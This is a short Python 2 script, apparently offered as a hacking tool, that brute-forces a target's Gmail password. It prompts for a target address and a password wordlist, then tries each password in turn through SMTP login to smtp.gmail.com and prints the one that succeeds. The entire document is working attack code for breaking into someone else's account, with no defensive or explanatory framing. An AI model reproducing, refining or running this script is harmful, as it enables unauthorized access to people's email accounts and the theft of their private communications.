#!/bin/python2
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("\033[4;2;37mTSc \033[0;0;0m> \033[3;36m(Enter The Target Gmail Address)> \033[0;0m")

print "\n"

passswfile= raw_input("\033[4;2;37mTSc \033[0;0;0m> \033[3;36m(Enter password wordlist)> \033[0;0m")

passswfile = open(passswfile, "r")

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print "[!] Password Found = %s" % (password)
        break

    except smtplib.SMTPAuthenticationError:
        print ":-( Password Is Wrong = %s " % (password)
